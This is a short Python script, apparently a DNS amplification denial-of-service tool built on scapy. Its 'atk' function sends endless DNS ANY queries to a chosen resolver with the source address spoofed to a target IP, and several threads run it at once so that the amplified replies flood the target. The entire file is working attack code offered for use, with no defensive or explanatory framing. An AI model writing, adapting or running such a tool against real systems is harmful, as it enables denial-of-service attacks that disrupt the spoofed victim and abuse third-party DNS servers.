#!/bin/python3

from scapy.all import *
import sys
import threading

def atk(dnsserver,target):
    count = 0
    while True:
        count += 1
        p = IP(dst=dnsserver)/UDP(dport=53)/DNS(id=count,qd=DNSQR(qname=dnsserver,qtype=0xff)) # For DNS ANY requests
        p.src = target
        send(p)

def usage():
    print("[Usage]:")
    print(sys.argv[0],"<DNS Server to act as proxy>","<Target IP>","<Number of threads>[default=4]")

def main():
    if(len(sys.argv) < 3):
        usage()
        exit(0)
    else:
        threads = 4
        dnsserver = sys.argv[1]
        target = sys.argv[2]
        if(len(sys.argv) == 4):
            threads = int(sys.argv[3])
    for _ in range(1,threads+1):
        threading.Thread(target=atk,args=(dnsserver,target)).start()

if __name__ == "__main__":
    main()
